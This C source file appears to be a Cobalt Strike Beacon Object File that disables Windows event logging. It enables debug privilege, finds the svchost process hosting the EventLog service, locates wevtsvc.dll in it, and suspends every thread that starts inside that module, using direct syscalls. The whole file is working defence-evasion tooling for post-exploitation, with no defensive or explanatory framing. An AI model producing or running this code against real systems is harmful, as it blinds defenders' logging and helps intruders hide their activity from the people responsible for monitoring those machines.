#pragma GCC diagnostic ignored "-Wint-to-pointer-cast"

#include <windows.h>
#include "syscalls.h"
#include "beacon.h"
#include <tlhelp32.h> 
#include <psapi.h>
#include <string.h>

// KERNEL32
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
WINBASEAPI BOOL WINAPI KERNEL32$K32EnumProcessModules(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded);
WINBASEAPI BOOL WINAPI KERNEL32$K32GetModuleBaseNameW(HANDLE hProcess, HMODULE hModule, LPWSTR lpBaseName, DWORD nSize);
WINBASEAPI BOOL WINAPI KERNEL32$K32GetModuleInformation(HANDLE hProcess, HMODULE hModule, LPMODULEINFO lpmodinfo, DWORD cb);
WINBASEAPI BOOL WINAPI KERNEL32$Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
WINBASEAPI BOOL WINAPI KERNEL32$Thread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);

// ADVAPI32
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
WINADVAPI BOOL WINAPI ADVAPI32$QueryServiceStatusEx(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);

// MSVCRT
WINBASEAPI wchar_t* __cdecl MSVCRT$wcscmp(const wchar_t* _lhs, const wchar_t* _rhs);

void getDebugPriv()
{
	HANDLE curToken = NULL;
	TOKEN_PRIVILEGES tkp;
	LUID luid;
	ULONG retLength = NULL;
	
	NtOpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &curToken);
	if (curToken == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get a handle to the current process token!, Error: %i", KERNEL32$GetLastError());
		return;
	}

	if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid))
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Privilege lookup failed!, Error: %i", KERNEL32$GetLastError());
		return;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	NtAdjustPrivilegesToken(curToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, &retLength);
	if (KERNEL32$GetLastError() != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Error adjusting token privileges!, Error: %i", KERNEL32$GetLastError());
	}
}

DWORD getEventLogPID()
{
	SC_HANDLE sc;
	SC_HANDLE svc;
	SERVICE_STATUS_PROCESS svcStatus = {};
	DWORD bytesNeeded = 0;
	DWORD procID;

	sc = ADVAPI32$OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	svc = ADVAPI32$OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);
	ADVAPI32$QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStatus, sizeof(svcStatus), &bytesNeeded);

	procID = svcStatus.dwProcessId;
	return procID;
}

HANDLE getHandleToTargetProc(DWORD processID)
{
	HANDLE targetProcHandle = NULL;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)processID;
	cid.UniqueThread = 0;

	NtOpenProcess(&targetProcHandle, PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
	if (targetProcHandle == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Could not obtain a handle to the process!, Error: %i", KERNEL32$GetLastError());
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained a handle to the process with PID: %i!", processID);
	}
	return targetProcHandle;
}

MODULEINFO getEventLogBaseAddress(HANDLE targetProc)
{
	HMODULE modules[256] = {};
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	SIZE_T modulesCount = 0;
	WCHAR remoteModuleName[128] = {};
	MODULEINFO serviceModuleInfo = {};
	int moduleFound = 0;

	KERNEL32$K32EnumProcessModules(targetProc, modules, modulesSize, &modulesSizeNeeded);
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
	HMODULE serviceModule = NULL;

	for (size_t m = 0; m < modulesCount; m++)
	{
		serviceModule = modules[m];
		KERNEL32$K32GetModuleBaseNameW(targetProc, serviceModule, remoteModuleName, sizeof(remoteModuleName));

		if (MSVCRT$wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
		{
			moduleFound = 1;
			break;
		}
	}

	if (moduleFound == 1)
	{
		KERNEL32$K32GetModuleInformation(targetProc, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Found the EventLog Module (wevtsvc.dll) at %p", serviceModule);
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Could not find the EventLog Module (wevtsvc.dll)!");
	}
	NtClose(targetProc);
	return(serviceModuleInfo);
}

void suspendEventLog(MODULEINFO serviceModuleInfo, DWORD PID)
{
	HANDLE snapshot = NULL;
	BOOL valid_thread;
	DWORD_PTR threadStartAddr = 0;
	HANDLE hThread;
	ULONG suspendCount = NULL;

	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;
	oa.Length = NULL;
	oa.RootDirectory = NULL;
	oa.ObjectName = NULL;
	oa.Attributes = NULL;
	oa.SecurityDescriptor = NULL;
	oa.SecurityQualityOfService = NULL;

	snapshot = KERNEL32$CreateToolhelp32Snapshot((TH32CS_SNAPTHREAD), 0);
	if (snapshot == INVALID_HANDLE_VALUE)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create a snapshot!");
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created a snapshot!");
	}

	THREADENTRY32 t_entry = { sizeof(THREADENTRY32) };

	valid_thread = KERNEL32$Thread32First(snapshot, &t_entry);
	while (valid_thread)
	{
		if (t_entry.th32OwnerProcessID == PID)
		{
			cid.UniqueProcess = NULL;
			cid.UniqueThread = (HANDLE)t_entry.th32ThreadID;
			hThread = NULL;

			NtOpenThread(&hThread, THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, &oa, &cid);
			if (hThread == NULL)
			{
				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open a handle to the thread with ID: %i!", t_entry.th32ThreadID);
			}

			NtQueryInformationThread(hThread, (THREADINFOCLASS)0x9, &threadStartAddr, sizeof(DWORD_PTR), NULL);
			if (threadStartAddr == 0)
			{
				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to call NtQueryInformationThread on thread with ID: %i!", t_entry.th32ThreadID);
			}

			if (threadStartAddr >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddr <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[Y] Suspending EventLog thread with ID %i and start address %p!", t_entry.th32ThreadID, threadStartAddr);
				NtSuspendThread(hThread, &suspendCount);
				NtClose(hThread);
			}
			else
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[N] Thread with ID %i and start address %p is not related to the EventLog!", t_entry.th32ThreadID, threadStartAddr);
				NtClose(hThread);
			}

		}
		valid_thread = KERNEL32$Thread32Next(snapshot, &t_entry);
	}
	NtClose(snapshot);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Finished suspending the Event Log!");
}


void go(void)
{
	DWORD pid;
	HANDLE targetHandle = NULL;
	MODULEINFO serviceModuleInfo;

	// Enable debug privileges
	getDebugPriv();

	// Find PID of svchost process hosting event log
	pid = getEventLogPID();
	if (pid != NULL)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Located the process hosting the event log with PID: %i!", pid);
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to locate the process hosting the event log!");
		return;
	}

	// Get handle to the svchost process hosting the event log
	targetHandle = getHandleToTargetProc(pid);
	if (targetHandle == NULL)
	{
		return;
	}

	// Get the address of the wevtsvc.dll module in the svchost process
	serviceModuleInfo = getEventLogBaseAddress(targetHandle);

	// Suspend the threads with a start address in the wevtsvc.dll module
	suspendEventLog(serviceModuleInfo, pid);

	return;
}



